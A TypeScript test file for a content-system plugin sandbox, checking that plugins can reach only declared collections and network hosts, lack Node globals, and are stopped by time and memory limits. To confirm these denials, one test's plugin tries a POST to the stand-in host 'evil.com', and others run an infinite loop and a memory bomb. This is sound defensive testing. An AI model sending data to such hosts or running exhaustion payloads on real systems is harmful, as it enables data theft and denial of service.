import { manifestSchema, type Manifest } from "@wuppy/plugin-types";
import { describe, expect, it } from "vitest";
import { loadPlugin, type HostDeps } from "../../src/plugins/host.ts";

const manifest = (over: Record<string, unknown> = {}): Manifest =>
	manifestSchema.parse({
		id: "t",
		version: "1.0.0",
		hooks: ["onContentUpdated"],
		capabilities: {
			content: { read: ["posts"] },
			network: [{ host: "api.example.com", methods: ["POST"], paths: ["/in/"] }],
		},
		...over,
	});

function deps(over: Partial<HostDeps> = {}): HostDeps & { logs: string[]; fetched: string[] } {
	const logs: string[] = [];
	const fetched: string[] = [];
	return {
		logs,
		fetched,
		log: (m) => logs.push(m),
		readContent: async (c, s) => (c === "posts" && s === "a" ? { data: { title: "A" }, body: "hello" } : null),
		fetch: async (url) => {
			fetched.push(url);
			return { status: 200, body: "pong" };
		},
		...over,
	};
}

const event = { type: "content.updated", collection: "posts", slug: "a", at: "now" };

describe("plugin sandbox", () => {
	it("runs a hook and lets it log through the host", async () => {
		const d = deps();
		const p = await loadPlugin(
			manifest(),
			`globalThis.__plugin = { onContentUpdated: (e, ctx) => ctx.log("saw " + e.slug) };`,
			d,
		);
		expect(await p.dispatch("onContentUpdated", event)).toEqual({ ok: true });
		expect(d.logs).toEqual(["saw a"]);
		p.dispose();
	});

	it("reads only the collections it declared", async () => {
		const d = deps();
		const p = await loadPlugin(
			manifest(),
			`globalThis.__plugin = { onContentUpdated: async (e, ctx) => {
				const ok = await ctx.content.get("posts", "a");
				ctx.log("ok:" + ok.data.title);
				try { await ctx.content.get("pages", "x"); ctx.log("LEAK"); } catch (err) { ctx.log("denied:" + err.message); }
			} };`,
			d,
		);
		await p.dispatch("onContentUpdated", event);
		expect(d.logs[0]).toBe("ok:A");
		expect(d.logs[1]).toMatch(/^denied:.*pages/);
		expect(d.logs).not.toContain("LEAK");
		p.dispose();
	});

	it("network is limited to declared host/method/path; every call goes through the host", async () => {
		const d = deps();
		const p = await loadPlugin(
			manifest(),
			`globalThis.__plugin = { onContentUpdated: async (e, ctx) => {
				const r = await ctx.fetch("https://api.example.com/in/x", { method: "POST", body: "{}" });
				ctx.log("got:" + r.status + ":" + r.body);
				for (const [u, m] of [["https://evil.com/in/", "POST"], ["https://api.example.com/in/x", "GET"], ["http://api.example.com/in/x", "POST"]]) {
					try { await ctx.fetch(u, { method: m }); ctx.log("LEAK " + u); } catch { ctx.log("denied"); }
				}
			} };`,
			d,
		);
		await p.dispatch("onContentUpdated", event);
		expect(d.fetched).toEqual(["https://api.example.com/in/x"]);
		expect(d.logs).toEqual(["got:200:pong", "denied", "denied", "denied"]);
		p.dispose();
	});

	it("has no Node or network globals", async () => {
		const d = deps();
		const p = await loadPlugin(
			manifest(),
			`globalThis.__plugin = { onContentUpdated: (e, ctx) => ctx.log([typeof process, typeof require, typeof fetch, typeof XMLHttpRequest, typeof Buffer, typeof setTimeout].join(",")) };`,
			d,
		);
		await p.dispatch("onContentUpdated", event);
		expect(d.logs).toEqual(["undefined,undefined,undefined,undefined,undefined,undefined"]);
		p.dispose();
	});

	it("kills an infinite loop at the time limit and keeps the host alive", async () => {
		const p = await loadPlugin(
			manifest({ limits: { timeoutMs: 100, memoryMb: 16 } }),
			`globalThis.__plugin = { onContentUpdated: () => { for (;;) {} } };`,
			deps(),
		);
		const started = Date.now();
		const res = await p.dispatch("onContentUpdated", event);
		expect(res.ok).toBe(false);
		expect(Date.now() - started).toBeLessThan(3000);
		p.dispose();
	});

	it("contains a memory bomb", async () => {
		const p = await loadPlugin(
			manifest({ limits: { timeoutMs: 2000, memoryMb: 4 } }),
			`globalThis.__plugin = { onContentUpdated: () => { const a = []; for (;;) a.push(new Array(10000).fill("x")); } };`,
			deps(),
		);
		expect((await p.dispatch("onContentUpdated", event)).ok).toBe(false);
		p.dispose();
	});

	it("a throwing plugin reports an error instead of crashing the host", async () => {
		const p = await loadPlugin(
			manifest(),
			`globalThis.__plugin = { onContentUpdated: () => { throw new Error("boom"); } };`,
			deps(),
		);
		const res = await p.dispatch("onContentUpdated", event);
		expect(res).toMatchObject({ ok: false });
		expect(JSON.stringify(res)).toContain("boom");
		p.dispose();
	});

	it("ignores hooks the manifest did not declare", async () => {
		const d = deps();
		const p = await loadPlugin(
			manifest({ hooks: [] }),
			`globalThis.__plugin = { onContentUpdated: (e, ctx) => ctx.log("should not run") };`,
			d,
		);
		expect(await p.dispatch("onContentUpdated", event)).toEqual({ ok: true, skipped: true });
		expect(d.logs).toEqual([]);
		p.dispose();
	});

	it("fails closed: plugin code that does not parse is not loaded", async () => {
		await expect(loadPlugin(manifest(), `this is not javascript`, deps())).rejects.toThrow(/load/i);
	});
});
